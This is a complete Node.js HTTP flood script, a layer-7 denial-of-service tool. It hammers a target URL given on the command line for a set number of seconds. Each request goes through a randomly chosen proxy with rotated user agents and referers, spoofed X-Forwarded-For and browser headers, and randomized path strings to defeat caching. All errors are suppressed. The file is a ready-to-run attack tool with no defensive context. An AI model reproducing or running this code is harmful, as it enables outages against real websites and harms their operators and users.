const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

var target = process.argv[2];
var defaultTarget = target;
var time = process.argv[3];
var proxyFile = process.argv[4];
var useragentFile = process.argv[5];
var refererFile = process.argv[6];
var method = process.argv[7];

var request = require('request');
const fs = require('fs');
const url = require("url");
const proxies = fs.readFileSync(proxyFile, 'utf-8').match(/\S+/g);
const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
const referers = fs.readFileSync(refererFile, 'utf-8').replace(/\r/g, '').split('\n');

setTimeout(() => { process.exit(1); }, time * 1000);

setInterval(() => {
    target = defaultTarget.replace(/%RAND%/g, RandomString(RandomInt(9, 23)));
    //console.log(`Attack sent -> ${target}`);
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var useragent = userAgents[Math.floor(Math.random() * userAgents.length)];
    var referer = referers[Math.floor(Math.random() * referers.length)];

    for (var i = 0; i < 1; i++) {
        var sendRequest = request({
            method: method,
            url: target,
            followRedirect: true,
            timeout: 10000,
            headers: 
            {
                "Referer" : referer,
                "Accept" : "*/*",
                "User-Agent" : useragent,
                "Upgrade-Insecure-Requests" : "1",
                "Accept-Encoding" : "*",
                "Accept-Language" : "*",
                "Cache-Control" : "no-cache",
                "Pragma": "no-cache",
                "Sec-ch-ua": '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Connection" : "keep-alive",
                "Max-Forwards": "10",
                "X-Forwarded-For" : proxy.split(':')[0]
            },
            proxy: 'http://' + proxy
        }, function (error, response, body) { /*console.log(body); if(body.contains("Cloudflare")) { console.log("Cloudflare detected, aborting requests!"); sendRequest.abort(); delete sendRequest; }*/ });
        setTimeout(function () { sendRequest.abort(); return delete sendRequest; }, 10000);
    }

});

process.on('uncaughtException', (err) => { });
process.on('unhandledRejection', (err) => { });

function RandomInt(min, max) {
    return Math.floor(
      Math.random() * (max - min + 1) + min
    )
}
  
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}